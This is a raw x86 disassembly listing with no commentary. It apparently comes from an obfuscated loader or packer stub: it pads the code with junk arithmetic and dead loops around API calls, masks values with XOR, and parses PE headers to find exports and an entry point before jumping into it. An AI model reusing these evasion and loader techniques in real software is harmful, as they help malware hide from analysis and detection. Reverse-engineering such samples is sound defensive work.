  409480:	adc    edi,DWORD PTR ds:0x42ef18
  409486:	mov    DWORD PTR ds:0x43059e,edi
  40948c:	mov    eax,DWORD PTR [ebp-0x1c]
  40948f:	sbb    DWORD PTR ds:0x42ef30,0x42e86a
  409499:	mov    edx,DWORD PTR [ebp-0x44]
  40949c:	sbb    DWORD PTR ds:0x42ef20,0x4305ba
  4094a6:	xor    eax,esi
  4094a8:	add    eax,ebx
  4094aa:	movzx  edi,WORD PTR ds:0x4305c2
  4094b1:	and    DWORD PTR ds:0x4305be,edi
  4094b7:	mov    DWORD PTR [edx],eax
  4094b9:	add    DWORD PTR ds:0x42e876,0x43059a
  4094c3:	mov    DWORD PTR [ebp-0x54],ecx
  4094c6:	or     edi,edi
  4094c8:	lea    eax,[ebp-0x54]
  4094cb:	mov    DWORD PTR [ebp-0x10],eax
  4094ce:	sub    ecx,DWORD PTR ds:0x4305a6
  4094d4:	mov    eax,DWORD PTR [ebp-0x54]
  4094d7:	mov    ecx,DWORD PTR [ebp-0x10]
  4094da:	mov    DWORD PTR ds:0x42ef2c,0x1c
  4094e4:	cmp    DWORD PTR ds:0x42ef2c,0x0
  4094eb:	je     0x409533
  4094f1:	cmp    DWORD PTR ds:0x42ef2c,0x27
  4094f8:	jne    0x40950c
  4094fe:	push   DWORD PTR [ebp-0x20]
  409501:	push   0x215b
  409506:	call   DWORD PTR ds:0x42ecb8
  40950c:	xor    edi,edi
  40950e:	xor    edi,DWORD PTR ds:0x42ef2c
  409514:	dec    edi
  409515:	mov    DWORD PTR ds:0x42ef2c,edi
  40951b:	jmp    0x4094e4
  409520:	movzx  edi,BYTE PTR ds:0x42e86a
  409527:	or     edi,DWORD PTR ds:0x43063e
  40952d:	mov    DWORD PTR ds:0x42e86a,edi
  409533:	xor    eax,esi
  409535:	xor    edi,0xc6b
  40953b:	add    eax,0x32729d
  409540:	mov    DWORD PTR [ecx],eax
  409542:	mov    eax,ds:0x41227c
  409547:	sbb    DWORD PTR ds:0x4305a2,0x6967
  409551:	mov    DWORD PTR [ebp-0x28],0x8e12febc
  409558:	mov    edi,DWORD PTR ds:0x43059a
  40955e:	sbb    DWORD PTR ds:0x42ef0c,edi
  409564:	mov    eax,DWORD PTR [eax]
  409566:	mov    DWORD PTR ds:0x42ef24,0x19
  409570:	cmp    DWORD PTR ds:0x42ef24,0x0
  409577:	je     0x40961e
  40957d:	cmp    DWORD PTR ds:0x42ef24,0x29
  409584:	jne    0x4095c1
  40958a:	push   DWORD PTR [ebp-0xc]
  40958d:	push   DWORD PTR [ebp-0x1c]
  409590:	push   0x61da
  409595:	push   DWORD PTR [ebp-0xc]
  409598:	push   DWORD PTR [ebp-0x1c]
  40959b:	push   DWORD PTR [ebp-0x20]
  40959e:	push   DWORD PTR [ebp-0x1c]
  4095a1:	push   DWORD PTR [ebp-0x28]
  4095a4:	push   0x400000
  4095a9:	push   DWORD PTR [ebp-0xc]
  4095ac:	push   0x2e1f
  4095b1:	push   0x5a6c
  4095b6:	push   0x7112
  4095bb:	call   DWORD PTR ds:0x42ebb8
  4095c1:	xor    edi,edi
  4095c3:	xor    edi,DWORD PTR ds:0x42ef24
  4095c9:	dec    edi
  4095ca:	mov    DWORD PTR ds:0x42ef24,edi
  4095d0:	jmp    0x409570
  4095d5:	and    DWORD PTR ds:0x42e85e,0x0
  4095df:	jmp    0x4095f1
  4095e4:	mov    edi,DWORD PTR ds:0x42e85e
  4095ea:	inc    edi
  4095eb:	mov    DWORD PTR ds:0x42e85e,edi
  4095f1:	cmp    DWORD PTR ds:0x42e85e,0x18
  4095f8:	jae    0x40961e
  4095fe:	cmp    DWORD PTR ds:0x42e85e,0x1f
  409605:	jne    0x409619
  40960b:	push   0x6de3
  409610:	push   DWORD PTR [ebp-0x28]
  409613:	call   DWORD PTR ds:0x42ecbc
  409619:	jmp    0x4095e4
  40961e:	mov    cx,WORD PTR [ebp-0x14]
  409622:	movzx  ecx,cx
  409625:	add    ecx,DWORD PTR [eax]
  409627:	xor    eax,eax
  409629:	mov    DWORD PTR [ebp-0x34],0xf89c8531
  409630:	mov    DWORD PTR [ebp-0x10],ecx
  409633:	mov    edi,0x5a3fc9c
  409638:	add    DWORD PTR ds:0x42e862,edx
  40963e:	mov    eax,DWORD PTR [ebp-0x1c]
  409641:	xor    ecx,ecx
  409643:	xor    ecx,DWORD PTR ds:0x4305a2
  409649:	sub    DWORD PTR ds:0x43058a,ecx
  40964f:	mov    ecx,DWORD PTR [ebp-0xc]
  409652:	or     DWORD PTR ds:0x42ef2c,0x4305a2
  40965c:	xor    eax,esi
  40965e:	mov    DWORD PTR ds:0x4305aa,0x4c41
  409668:	add    eax,ebx
  40966a:	mov    DWORD PTR ds:0x42e86e,0x490b
  409674:	cmp    DWORD PTR [ecx],eax
  409676:	jne    0x409a49
  40967c:	mov    DWORD PTR ds:0x42e85e,0x1f
  409686:	cmp    DWORD PTR ds:0x42e85e,0x0
  40968d:	je     0x40972a
  409693:	cmp    DWORD PTR ds:0x42e85e,0xb
  40969a:	jne    0x4096b3
  4096a0:	push   DWORD PTR [ebp-0xc]
  4096a3:	push   0x6e82
  4096a8:	push   0x1d82
  4096ad:	call   DWORD PTR ds:0x42ebd4
  4096b3:	cmp    DWORD PTR ds:0x42e85e,0xc
  4096ba:	jne    0x4096cb
  4096c0:	mov    eax,ds:0x42e85e
  4096c5:	dec    eax
  4096c6:	mov    ds:0x42e85e,eax
  4096cb:	mov    eax,ds:0x42e85e
  4096d0:	dec    eax
  4096d1:	mov    ds:0x42e85e,eax
  4096d6:	jmp    0x409686
  4096db:	and    DWORD PTR ds:0x42ef24,0x0
  4096e5:	jmp    0x4096f7
  4096ea:	mov    ecx,DWORD PTR ds:0x42ef24
  4096f0:	inc    ecx
  4096f1:	mov    DWORD PTR ds:0x42ef24,ecx
  4096f7:	cmp    DWORD PTR ds:0x42ef24,0x11
  4096fe:	jae    0x40972a
  409704:	cmp    DWORD PTR ds:0x42ef24,0x1a
  40970b:	jne    0x40971f
  409711:	push   0x430592
  409716:	push   DWORD PTR [ebp-0x1c]
  409719:	call   DWORD PTR ds:0x42ecc0
  40971f:	jmp    0x4096ea
  409724:	or     ecx,DWORD PTR ds:0x43058a
  40972a:	mov    eax,DWORD PTR [ebp-0x1c]
  40972d:	mov    DWORD PTR ds:0x42ef14,0x1a
  409737:	cmp    DWORD PTR ds:0x42ef14,0x0
  40973e:	je     0x40977d
  409744:	cmp    DWORD PTR ds:0x42ef14,0x29
  40974b:	jne    0x409769
  409751:	push   0x6cb7
  409756:	push   DWORD PTR [ebp-0x20]
  409759:	push   0x3e46
  40975e:	push   0x42ef2c
  409763:	call   DWORD PTR ds:0x42ecc4
  409769:	xor    ecx,ecx
  40976b:	or     ecx,DWORD PTR ds:0x42ef14
  409771:	dec    ecx
  409772:	mov    DWORD PTR ds:0x42ef14,ecx
  409778:	jmp    0x409737
  40977d:	mov    ecx,DWORD PTR [ebp-0x10]
  409780:	xor    eax,esi
  409782:	adc    DWORD PTR ds:0x4305ae,0x39c3
  40978c:	add    eax,ebx
  40978e:	mov    DWORD PTR ds:0x43064e,0x5e01
  409798:	cmp    DWORD PTR [ecx],eax
  40979a:	jne    0x4098a3
  4097a0:	xor    ecx,ecx
  4097a2:	add    ecx,DWORD PTR ds:0x42ef18
  4097a8:	sub    DWORD PTR ds:0x42e862,ecx
  4097ae:	mov    eax,DWORD PTR [ebp-0x1c]
  4097b1:	xor    ecx,ecx
  4097b3:	mov    ecx,DWORD PTR [ebp-0x44]
  4097b6:	inc    DWORD PTR ds:0x430646
  4097bc:	xor    eax,esi
  4097be:	and    DWORD PTR ds:0x42e85a,0x0
  4097c8:	mov    edx,DWORD PTR ds:0x42e85a
  4097ce:	inc    edx
  4097cf:	mov    DWORD PTR ds:0x42e85a,edx
  4097d5:	cmp    DWORD PTR ds:0x42e85a,0x11
  4097dc:	jne    0x4097f0
  4097e2:	push   0x430656
  4097e7:	push   DWORD PTR [ebp-0x10]
  4097ea:	call   DWORD PTR ds:0x42ebd8
  4097f0:	cmp    DWORD PTR ds:0x42e85a,0x10
  4097f7:	jne    0x40980a
  4097fd:	mov    edx,DWORD PTR ds:0x42e85a
  409803:	inc    edx
  409804:	mov    DWORD PTR ds:0x42e85a,edx
  40980a:	cmp    DWORD PTR ds:0x42e85a,0x1c
  409811:	jb     0x4097c8
  409817:	add    eax,ebx
  409819:	sbb    edx,0x5b8
  40981f:	mov    DWORD PTR [ecx],eax
  409821:	mov    DWORD PTR ds:0x430642,0x1c
  40982b:	cmp    DWORD PTR ds:0x430642,0x0
  409832:	je     0x40987c
  409838:	cmp    DWORD PTR ds:0x430642,0xd
  40983f:	jne    0x409850
  409845:	push   0x4366
  40984a:	call   DWORD PTR ds:0x42ecc8
  409850:	cmp    DWORD PTR ds:0x430642,0xe
  409857:	jne    0x40986a
  40985d:	mov    edx,DWORD PTR ds:0x430642
  409863:	dec    edx
  409864:	mov    DWORD PTR ds:0x430642,edx
  40986a:	mov    edx,DWORD PTR ds:0x430642
  409870:	dec    edx
  409871:	mov    DWORD PTR ds:0x430642,edx
  409877:	jmp    0x40982b
  40987c:	mov    eax,DWORD PTR [ebp-0x44]
  40987f:	mov    ecx,DWORD PTR [ebp-0x34]
  409882:	adc    DWORD PTR ds:0x42ef14,ebx
  409888:	xor    ecx,esi
  40988a:	xor    DWORD PTR ds:0x43064a,edi
  409890:	mov    edx,0xffcd8d63
  409895:	and    DWORD PTR ds:0x4305a2,0x42e872
  40989f:	sub    edx,ecx
  4098a1:	add    DWORD PTR [eax],edx
  4098a3:	and    DWORD PTR ds:0x4305ba,0x0
  4098ad:	jmp    0x4098bd
  4098b2:	mov    eax,ds:0x4305ba
  4098b7:	inc    eax
  4098b8:	mov    ds:0x4305ba,eax
  4098bd:	cmp    DWORD PTR ds:0x4305ba,0x11
  4098c4:	jae    0x40990a
  4098ca:	cmp    DWORD PTR ds:0x4305ba,0xb
  4098d1:	jne    0x4098eb
  4098d7:	push   DWORD PTR [ebp-0x14]
  4098da:	push   DWORD PTR [ebp-0x10]
  4098dd:	push   0x45e3
  4098e2:	push   DWORD PTR [ebp-0x1c]
  4098e5:	call   DWORD PTR ds:0x42eccc
  4098eb:	cmp    DWORD PTR ds:0x4305ba,0xa
  4098f2:	jne    0x409903
  4098f8:	mov    eax,ds:0x4305ba
  4098fd:	inc    eax
  4098fe:	mov    ds:0x4305ba,eax
  409903:	jmp    0x4098b2
  409908:	not    eax
  40990a:	mov    eax,ds:0x41227c
  40990f:	mov    eax,DWORD PTR [eax]
  409911:	sub    DWORD PTR ds:0x4305c2,0x4305a6
  40991b:	mov    cx,WORD PTR [ebp-0x14]
  40991f:	and    DWORD PTR ds:0x42ef1c,0x42e86e
  409929:	movzx  ecx,cx
  40992c:	add    ecx,DWORD PTR [eax]
  40992e:	and    DWORD PTR ds:0x42ef14,0x0
  409938:	jmp    0x40994b
  40993d:	xor    eax,eax
  40993f:	add    eax,DWORD PTR ds:0x42ef14
  409945:	inc    eax
  409946:	mov    ds:0x42ef14,eax
  40994b:	cmp    DWORD PTR ds:0x42ef14,0x1d
  409952:	jae    0x409980
  409958:	cmp    DWORD PTR ds:0x42ef14,0x1f
  40995f:	jne    0x409975
  409965:	push   0x887a
  40996a:	push   0x3c32
  40996f:	call   DWORD PTR ds:0x42ebe0
  409975:	jmp    0x40993d
  40997a:	adc    eax,DWORD PTR ds:0x43059e
  409980:	mov    DWORD PTR [ebp-0x10],ecx
  409983:	sub    DWORD PTR ds:0x42e85e,0x488b
  40998d:	mov    eax,DWORD PTR [ebp-0x30]
  409990:	xor    ecx,ecx
  409992:	add    ecx,DWORD PTR ds:0x4305c2
  409998:	xor    ecx,DWORD PTR ds:0x4305be
  40999e:	mov    DWORD PTR ds:0x4305c2,ecx
  4099a4:	mov    ecx,DWORD PTR [ebp-0x30]
  4099a7:	xor    eax,esi
  4099a9:	sbb    DWORD PTR ds:0x4305b6,0x42ef14
  4099b3:	add    eax,eax
  4099b5:	and    DWORD PTR ds:0x42e86a,0x42ef08
  4099bf:	xor    ecx,esi
  4099c1:	sub    DWORD PTR ds:0x4305ba,0x1a55
  4099cb:	sub    ecx,eax
  4099cd:	or     DWORD PTR ds:0x4305b2,0x4305c2
  4099d7:	mov    ax,WORD PTR [ebp-0x14]
  4099db:	sub    DWORD PTR ds:0x42e85e,0x42e86a
  4099e5:	movzx  eax,ax
  4099e8:	sub    ecx,ebx
  4099ea:	mov    DWORD PTR ds:0x42e872,0x4be2
  4099f4:	cmp    eax,ecx
  4099f6:	mov    DWORD PTR ds:0x430646,0x6841
  409a00:	mov    eax,DWORD PTR [ebp-0x34]
  409a03:	movzx  ecx,WORD PTR [ebp-0x14]
  409a07:	mov    DWORD PTR ds:0x42e85a,0x46e
  409a11:	jg     0x409a30
  409a17:	xor    eax,esi
  409a19:	sub    ecx,eax
  409a1b:	adc    DWORD PTR ds:0x430586,0x430652
  409a25:	sub    ecx,ebx
  409a27:	mov    WORD PTR [ebp-0x14],cx
  409a2b:	jmp    0x409a49
  409a30:	not    DWORD PTR ds:0x42e85e
  409a36:	xor    eax,esi
  409a38:	lea    eax,[eax+ecx*1+0x32729d]
  409a3f:	mov    DWORD PTR ds:0x43065a,ebx
  409a45:	mov    WORD PTR [ebp-0x14],ax
  409a49:	mov    ecx,DWORD PTR [ebp-0x28]
  409a4c:	not    eax
  409a4e:	mov    eax,0x8e12febc
  409a53:	mov    DWORD PTR ds:0x42e86e,0x41a
  409a5d:	cmp    ecx,eax
  409a5f:	mov    DWORD PTR ds:0x42e86e,0x60ce
  409a69:	je     0x409a9b
  409a6f:	mov    DWORD PTR ds:0x42ef10,0x7d2b
  409a79:	mov    eax,DWORD PTR [ebp-0xc]
  409a7c:	mov    DWORD PTR ds:0x43059a,0x4b8f
  409a86:	mov    DWORD PTR [eax],0x60341e8d
  409a8c:	mov    DWORD PTR ds:0x42e85e,0x3193
  409a96:	jmp    0x409daf
  409a9b:	mov    ecx,DWORD PTR [ebp-0x28]
  409a9e:	cmp    ecx,0x5142ddba
  409aa4:	jne    0x409bad
  409aaa:	mov    DWORD PTR ds:0x43064e,ecx
  409ab0:	mov    eax,DWORD PTR [ebp-0xc]
  409ab3:	mov    DWORD PTR ds:0x4305be,0x644d
  409abd:	mov    DWORD PTR [eax],0x4214feba
  409ac3:	mov    eax,DWORD PTR [ebp-0xc]
  409ac6:	mov    DWORD PTR ds:0x43065a,0x1ed6
  409ad0:	mov    DWORD PTR [ebp-0x4],eax
  409ad3:	mov    DWORD PTR ds:0x43064a,edx
  409ad9:	mov    eax,DWORD PTR [ebp-0x30]
  409adc:	mov    eax,DWORD PTR [ebp-0x1c]
  409adf:	mov    DWORD PTR [ebp-0x4c],edi
  409ae2:	mov    eax,0xff7
  409ae7:	mov    eax,DWORD PTR [ebp-0x4c]
  409aea:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409af1:	cmp    eax,edi
  409af3:	mov    DWORD PTR ds:0x430652,0x7826
  409afd:	jne    0x409daf
  409b03:	add    DWORD PTR ds:0x42ef0c,0x42e85e
  409b0d:	mov    ax,WORD PTR [ebp-0x8]
  409b11:	sbb    ecx,DWORD PTR ds:0x4305ba
  409b17:	mov    ecx,0x8a40
  409b1c:	xor    ax,cx
  409b1f:	xor    ecx,DWORD PTR ds:0x42ef0c
  409b25:	mov    ecx,0x3b06
  409b2a:	add    ax,cx
  409b2d:	mov    ecx,DWORD PTR [ebp-0x4]
  409b30:	movzx  eax,ax
  409b33:	sub    DWORD PTR ds:0x430646,0x42ef28
  409b3d:	not    eax
  409b3f:	sbb    DWORD PTR ds:0x42e86a,0x43059a
  409b49:	and    eax,DWORD PTR [ecx]
  409b4b:	mov    ecx,DWORD PTR [ebp-0x4]
  409b4e:	mov    DWORD PTR ds:0x4305aa,0x2700
  409b58:	mov    DWORD PTR [ecx],eax
  409b5a:	jmp    0x409b70
  409b5f:	and    DWORD PTR ds:0x42e85e,0x43064e
  409b69:	xor    DWORD PTR [ebp-0x4c],0xe149ebc
  409b70:	mov    ax,WORD PTR [ebp-0x8]
  409b74:	not    DWORD PTR ds:0x4305c2
  409b7a:	push   DWORD PTR [ebp-0x4]
  409b7d:	adc    DWORD PTR ds:0x42ef28,0x430596
  409b87:	call   0x401000
  409b8c:	xor    DWORD PTR ds:0x42ef24,0x7536
  409b96:	test   eax,eax
  409b98:	mov    DWORD PTR ds:0x430586,0x7cfd
  409ba2:	je     0x409b5f
  409ba8:	jmp    0x409daf
  409bad:	movzx  ecx,WORD PTR ds:0x430596
  409bb4:	mov    ecx,DWORD PTR [ebp-0x28]
  409bb7:	cmp    ecx,0x1443fcbd
  409bbd:	jne    0x409bef
  409bc3:	mov    DWORD PTR ds:0x4305a2,0x6608
  409bcd:	mov    eax,DWORD PTR [ebp-0xc]
  409bd0:	mov    DWORD PTR ds:0x43058e,0x8ce
  409bda:	mov    DWORD PTR [eax],0x60062d8f
  409be0:	mov    DWORD PTR ds:0x4305ba,0x323c
  409bea:	jmp    0x409daf
  409bef:	mov    DWORD PTR ds:0x4305a2,0x6595
  409bf9:	mov    ecx,DWORD PTR [ebp-0x28]
  409bfc:	mov    DWORD PTR ds:0x42e876,0x5912
  409c06:	cmp    ecx,eax
  409c08:	jne    0x409d34
  409c0e:	sbb    DWORD PTR ds:0x4305be,edx
  409c14:	mov    eax,DWORD PTR [ebp-0x1c]
  409c17:	and    DWORD PTR ds:0x430642,0x28ff
  409c21:	mov    ecx,DWORD PTR [ebp-0xc]
  409c24:	mov    DWORD PTR ds:0x430646,0x5e2a
  409c2e:	xor    eax,esi
  409c30:	xor    DWORD PTR ds:0x430646,0x42ef0c
  409c3a:	add    eax,ebx
  409c3c:	cmp    DWORD PTR [ecx],eax
  409c3e:	je     0x409cc1
  409c44:	mov    ecx,DWORD PTR [ebp-0x54]
  409c47:	mov    eax,DWORD PTR [ebp-0xc]
  409c4a:	mov    eax,DWORD PTR [eax]
  409c4c:	mov    eax,DWORD PTR [eax+0x3c]
  409c4f:	lea    ecx,[ecx*8+0x78]
  409c56:	add    eax,ecx
  409c58:	mov    ecx,DWORD PTR [ebp-0xc]
  409c5b:	mov    ecx,DWORD PTR [ecx]
  409c5d:	mov    eax,DWORD PTR [eax+ecx*1]
  409c60:	mov    DWORD PTR [ebp-0x8],eax
  409c63:	mov    eax,DWORD PTR [ebp-0x1c]
  409c66:	xor    eax,esi
  409c68:	add    eax,ebx
  409c6a:	mov    DWORD PTR [ebp-0x4],eax
  409c6d:	mov    eax,DWORD PTR [ebp-0x1c]
  409c70:	mov    ecx,DWORD PTR [ebp-0x8]
  409c73:	xor    eax,esi
  409c75:	add    eax,ebx
  409c77:	cmp    ecx,eax
  409c79:	je     0x409daf
  409c7f:	mov    eax,DWORD PTR [ebp-0xc]
  409c82:	mov    ecx,DWORD PTR [ebp-0x8]
  409c85:	add    ecx,DWORD PTR [eax]
  409c87:	mov    DWORD PTR [ebp-0x4],ecx
  409c8a:	mov    eax,DWORD PTR [ebp-0x4]
  409c8d:	mov    ecx,DWORD PTR [ebp-0xc]
  409c90:	mov    eax,DWORD PTR [eax+0xc]
  409c93:	mov    ecx,DWORD PTR [ecx]
  409c95:	mov    al,BYTE PTR [eax+ecx*1]
  409c98:	add    al,0x36
  409c9a:	xor    al,0x48
  409c9c:	cmp    al,0xc9
  409c9e:	je     0x409cb5
  409ca4:	mov    eax,DWORD PTR [ebp-0x1c]
  409ca7:	mov    ecx,DWORD PTR [ebp-0xc]
  409caa:	xor    eax,esi
  409cac:	add    eax,ebx
  409cae:	mov    DWORD PTR [ecx],eax
  409cb0:	jmp    0x409daf
  409cb5:	xor    DWORD PTR [ebp-0x28],0x5fd8f
  409cbc:	jmp    0x409daf
  409cc1:	mov    eax,DWORD PTR [ebp-0xc]
  409cc4:	mov    ecx,DWORD PTR [ebp-0x10]
  409cc7:	mov    ecx,DWORD PTR [ecx]
  409cc9:	mov    DWORD PTR [eax],ecx
  409ccb:	mov    eax,DWORD PTR [ebp-0xc]
  409cce:	mov    DWORD PTR [ebp-0x4],eax
  409cd1:	mov    eax,DWORD PTR [ebp-0x30]
  409cd4:	mov    eax,DWORD PTR [ebp-0x1c]
  409cd7:	mov    DWORD PTR [ebp-0x5c],edi
  409cda:	mov    eax,DWORD PTR [ebp-0x5c]
  409cdd:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409ce4:	cmp    eax,edi
  409ce6:	jne    0x409daf
  409cec:	mov    ax,WORD PTR [ebp-0x8]
  409cf0:	mov    ecx,0x8a40
  409cf5:	xor    ax,cx
  409cf8:	mov    ecx,0x3b06
  409cfd:	add    ax,cx
  409d00:	mov    ecx,DWORD PTR [ebp-0x4]
  409d03:	movzx  eax,ax
  409d06:	not    eax
  409d08:	and    eax,DWORD PTR [ecx]
  409d0a:	mov    ecx,DWORD PTR [ebp-0x4]
  409d0d:	mov    DWORD PTR [ecx],eax
  409d0f:	jmp    0x409d1b
  409d14:	xor    DWORD PTR [ebp-0x5c],0xe149ebc
  409d1b:	mov    ax,WORD PTR [ebp-0x8]
  409d1f:	push   DWORD PTR [ebp-0x4]
  409d22:	call   0x401000
  409d27:	test   eax,eax
  409d29:	je     0x409d14
  409d2f:	jmp    0x409daf
  409d34:	mov    eax,DWORD PTR [ebp-0x28]
  409d37:	cmp    eax,0x33450cad
  409d3c:	jne    0x409daf
  409d42:	mov    eax,DWORD PTR [ebp-0xc]
  409d45:	mov    DWORD PTR [eax],0x443dc9d
  409d4b:	mov    eax,DWORD PTR [ebp-0xc]
  409d4e:	mov    DWORD PTR [ebp-0x4],eax
  409d51:	mov    eax,DWORD PTR [ebp-0x30]
  409d54:	mov    eax,DWORD PTR [ebp-0x1c]
  409d57:	mov    DWORD PTR [ebp-0x40],edi
  409d5a:	mov    eax,DWORD PTR [ebp-0x40]
  409d5d:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409d64:	cmp    eax,edi
  409d66:	jne    0x409daf
  409d6c:	mov    ax,WORD PTR [ebp-0x8]
  409d70:	mov    ecx,0x8a40
  409d75:	xor    ax,cx
  409d78:	mov    ecx,0x3b06
  409d7d:	add    ax,cx
  409d80:	mov    ecx,DWORD PTR [ebp-0x4]
  409d83:	movzx  eax,ax
  409d86:	not    eax
  409d88:	and    eax,DWORD PTR [ecx]
  409d8a:	mov    ecx,DWORD PTR [ebp-0x4]
  409d8d:	mov    DWORD PTR [ecx],eax
  409d8f:	jmp    0x409d9b
  409d94:	xor    DWORD PTR [ebp-0x40],0xe149ebc
  409d9b:	mov    ax,WORD PTR [ebp-0x8]
  409d9f:	push   DWORD PTR [ebp-0x4]
  409da2:	call   0x401000
  409da7:	test   eax,eax
  409da9:	je     0x409d94
  409daf:	mov    eax,DWORD PTR [ebp-0x28]
  409db2:	cmp    eax,0x8e12febc
  409db7:	je     0x409638
  409dbd:	mov    eax,DWORD PTR [ebp-0xc]
  409dc0:	mov    eax,ds:0x4121a8
  409dc5:	mov    eax,DWORD PTR [eax+0x18c]
  409dcb:	mov    eax,DWORD PTR [eax]
  409dcd:	mov    DWORD PTR [ebp-0x74],eax
  409dd0:	mov    eax,0xf89c8531
  409dd5:	mov    DWORD PTR [ebp-0x10],eax
  409dd8:	mov    DWORD PTR [ebp-0x10],eax
  409ddb:	mov    DWORD PTR [ebp-0x10],eax
  409dde:	mov    DWORD PTR [ebp-0x10],0xf89c8535
  409de5:	mov    DWORD PTR [ebp-0x8],eax
  409de8:	mov    DWORD PTR [ebp-0x8],0xf89c853d
  409def:	mov    edi,DWORD PTR [ebp-0x20]
  409df2:	xor    edi,esi
  409df4:	add    edi,ebx
  409df6:	jmp    0x409e31
  409dfb:	mov    eax,DWORD PTR [ebp-0x18]
  409dfe:	xor    eax,esi
  409e00:	lea    eax,[eax+edi*1+0x32729d]
  409e07:	push   eax
  409e08:	mov    eax,DWORD PTR [ebp-0x10]
  409e0b:	xor    eax,esi
  409e0d:	lea    eax,[ebp+eax*1+0x3272a5]
  409e14:	push   eax
  409e15:	mov    eax,ds:0x4121a8
  409e1a:	push   DWORD PTR [eax+0x1bc]
  409e20:	call   0x4052e7
  409e25:	mov    eax,DWORD PTR [ebp-0x18]
  409e28:	xor    eax,esi
  409e2a:	lea    edi,[edi+eax*1+0x32729d]
  409e31:	mov    eax,DWORD PTR [ebp-0x18]
  409e34:	mov    ecx,DWORD PTR [ebp-0x18]
  409e37:	xor    ecx,esi
  409e39:	xor    eax,esi
  409e3b:	add    eax,ecx
  409e3d:	mov    ecx,DWORD PTR [ebp-0x18]
  409e40:	xor    ecx,esi
  409e42:	lea    eax,[eax+ecx*1+0x9757d7]
  409e49:	cmp    edi,eax
  409e4b:	jbe    0x409dfb
  409e51:	mov    eax,DWORD PTR [ebp+0xc]
  409e54:	mov    ds:0x41202c,eax
  409e59:	mov    eax,DWORD PTR [ebp+0x10]
  409e5c:	mov    ds:0x412280,eax
  409e61:	mov    eax,ds:0x41202c
  409e66:	mov    ecx,DWORD PTR [ebp-0x60]
  409e69:	sub    eax,ebx
  409e6b:	xor    eax,esi
  409e6d:	mov    DWORD PTR [ecx],eax
  409e6f:	mov    eax,DWORD PTR [ebp-0x58]
  409e72:	cmp    eax,0xf89c8532
  409e77:	je     0x409ed4
  409e7d:	mov    eax,DWORD PTR [ebp-0x20]
  409e80:	mov    ecx,DWORD PTR [ebp-0x50]
  409e83:	xor    eax,esi
  409e85:	add    eax,ebx
  409e87:	cmp    eax,ecx
  409e89:	je     0x409ed4
  409e8f:	mov    eax,ds:0x4121a8
  409e94:	mov    eax,DWORD PTR [eax+0x194]
  409e9a:	mov    ecx,DWORD PTR [eax]
  409e9c:	mov    eax,DWORD PTR [ecx+0x3c]
  409e9f:	push   DWORD PTR ds:0x412280
  409ea5:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  409ea9:	push   DWORD PTR ds:0x41202c
  409eaf:	add    eax,ecx
  409eb1:	mov    ecx,DWORD PTR ds:0x4121a8
  409eb7:	mov    ecx,DWORD PTR [ecx+0x194]
  409ebd:	push   DWORD PTR [ecx]
  409ebf:	call   eax
  409ec1:	mov    ecx,DWORD PTR ds:0x4121a8
  409ec7:	mov    ecx,DWORD PTR [ecx+0x1cc]
  409ecd:	mov    DWORD PTR [ecx],eax
  409ecf:	jmp    0x40a18e
  409ed4:	mov    eax,DWORD PTR [ebp-0x20]
  409ed7:	mov    ecx,DWORD PTR [ebp-0x74]
  409eda:	xor    eax,esi
  409edc:	add    eax,ebx
  409ede:	mov    edi,0xf89c85f5
  409ee3:	cmp    eax,ecx
  409ee5:	jne    0x409fe6
  409eeb:	mov    eax,DWORD PTR [ebp-0x20]
  409eee:	xor    eax,esi
  409ef0:	add    eax,ebx
  409ef2:	mov    ds:0x41222c,eax
  409ef7:	mov    eax,DWORD PTR [ebp-0x20]
  409efa:	xor    eax,esi
  409efc:	add    eax,ebx
  409efe:	mov    ds:0x412224,eax
  409f03:	mov    eax,DWORD PTR [ebp-0x18]
  409f06:	mov    DWORD PTR [ebp-0x8],eax
  409f09:	mov    eax,DWORD PTR [ebp-0x20]
  409f0c:	mov    DWORD PTR [ebp+0xc],eax
  409f0f:	mov    eax,DWORD PTR [ebp+0xc]
  409f12:	xor    eax,esi
  409f14:	add    eax,ebx
  409f16:	mov    DWORD PTR [ebp+0xc],eax
  409f19:	mov    eax,ds:0x412028
  409f1e:	mov    eax,DWORD PTR [eax]
  409f20:	mov    DWORD PTR [ebp+0xc],eax
  409f23:	mov    eax,ds:0x412230
  409f28:	mov    eax,DWORD PTR [eax]
  409f2a:	mov    DWORD PTR [ebp-0x60],eax
  409f2d:	mov    DWORD PTR [ebp+0x10],0xf89c8735
  409f34:	mov    eax,DWORD PTR [ebp+0x10]
  409f37:	xor    eax,esi
  409f39:	add    eax,ebx
  409f3b:	mov    DWORD PTR [ebp+0x10],eax
  409f3e:	mov    eax,ds:0x4121a8
  409f43:	mov    DWORD PTR [ebp+0x10],eax
  409f46:	mov    eax,DWORD PTR [ebp+0xc]
  409f49:	mov    DWORD PTR [ebp+0x10],eax
  409f4c:	mov    eax,DWORD PTR [ebp+0x10]
  409f4f:	push   0x4
  409f51:	pop    ecx
  409f52:	sub    ecx,eax
  409f54:	add    ecx,DWORD PTR [ebp-0x60]
  409f57:	mov    DWORD PTR [ebp-0x34],edi
  409f5a:	mov    DWORD PTR [ebp-0x10],ecx
  409f5d:	mov    DWORD PTR [ebp-0xc8],0xf89c8531
  409f67:	mov    eax,DWORD PTR [ebp+0x10]
  409f6a:	mov    DWORD PTR [ebp-0xc4],eax
  409f70:	mov    eax,DWORD PTR [ebp-0x10]
  409f73:	mov    DWORD PTR [ebp-0xc0],eax
  409f79:	mov    eax,DWORD PTR [ebp-0x34]
  409f7c:	xor    eax,esi
  409f7e:	add    eax,ebx
  409f80:	mov    DWORD PTR [ebp-0xbc],eax
  409f86:	lea    eax,[ebp-0x80]
  409f89:	mov    DWORD PTR [ebp-0xb8],eax
  409f8f:	mov    eax,DWORD PTR [ebp-0xc8]
  409f95:	xor    eax,esi
  409f97:	add    eax,ebx
  409f99:	mov    DWORD PTR [ebp-0xc8],eax
  409f9f:	lea    eax,[ebp-0xc8]
  409fa5:	push   eax
  409fa6:	mov    eax,DWORD PTR [ebp-0x8]
  409fa9:	xor    eax,esi
  409fab:	add    eax,ebx
  409fad:	push   eax
  409fae:	mov    eax,ds:0x4121c8
  409fb3:	push   0x41211e
  409fb8:	push   DWORD PTR [eax]
  409fba:	call   0x40b2c8
  409fbf:	and    DWORD PTR [ebp+0xc],0x0
  409fc3:	mov    eax,DWORD PTR [ebp-0x10]
  409fc6:	sub    eax,DWORD PTR [ebp+0xc]
  409fc9:	push   eax
